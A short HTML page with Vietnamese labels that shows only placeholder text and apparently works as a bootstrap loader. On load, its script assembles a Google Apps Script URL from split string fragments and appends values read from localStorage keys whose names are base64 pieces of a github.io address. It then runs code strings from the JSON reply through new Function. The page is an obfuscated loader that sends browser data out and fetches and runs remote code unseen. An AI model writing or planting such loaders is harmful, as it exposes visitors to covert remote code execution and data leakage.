<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, height=device-height, maximum-scale=1.0, user-scalable=no">
<meta charset="utf-8">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.0/jquery.min.js"></script>
<style>

	#Gioithieu, #Quang {
        position: absolute;
        /*border: solid;*/
        width: 100%;
        height: 100vh;
        left: 0px;
        top: 0px;
        background: white; 
    }
    
	#Quang {z-index: -1;}


	html, body {
        font-family: Arial, Helvetica, sans-serif;
        margin: 0;
        overscroll-behavior-y: contain; 
    }
	
    #Run {
    	display: none;
    
}





</style>
</head>
<body>
<div id="Gioithieu">
	<div>Thu</div>
    <div id="Run">Tới chương trình</div>
</div>
<div id="Quang"></div>

<script>
	function EID(NameID) {return document.getElementById(NameID);}
    
    window.addEventListener('DOMContentLoaded', (event) => {
    	RunFirst();
	});
    
    async function RunFirst() {
  		let promise = new Promise((resolve, reject) => {
    		setTimeout(function(){
				var url = GetLink();
				window.slag;
        
        		$.getJSON(url, function (json) {
					resolve("done!");
            
            		slag = json.records.map(doc => Object.values(doc));

                    //alert(slag[0][0]);
                    //var ifr = document.getElementById("myFrame");
                    //ifr.contentWindow.location.replace(slag[0][0] + str);

                    //str = slag[0][1];
                    //arr = str.split("][");
                    //dangnhap = (arr[3]=="chưa đăng nhập") ? false : true;
            	});
    		},5);
  		});

  		let result = await promise; 

  		if (result=="done!")
  			RunAfter();
	}

	function GetLink() {
		var arr1 =['htt','ps://scr','ipt.g','oog','le.com','/mac','ros/s/','AKfycbxQMu_FJCGmJG','cKIjyBOs-Ul8f3txv9L','_SbRqrUmTfaEgySqkw/e','xec'];
 	
		var script_url="";
		for (i=0;i<arr1.length;i++) script_url = script_url + arr1[i];
		
		var keyAll = "";
		var valueAll = "";
		for (i=0; i<localStorage.length; i++)  {  
        		key = localStorage.key(i);
			if(key=="aHR0cHM6Ly9leHByZ" || key=="XNzM25oYXQuZ2l0a" || key=="HViLmlvL0FJTy8") {
				keyAll = keyAll + key;  
        			valueAll = valueAll + localStorage.getItem(key);
			}
    		}
		var str = (keyAll!="") ? "&" + keyAll + "=" + valueAll : "";

		//var url = script_url+"?host=" + window.location.href + str;
		
        return script_url+"?host=" + "https://express3nhat.github.io/AIO/" + str;
}

	

    function RunAfter() {
        this[slag[1][1]] = new Function('return ' + slag[1][3])();
        this[slag[1][1]]();
    }



</script>

</body>
</html>
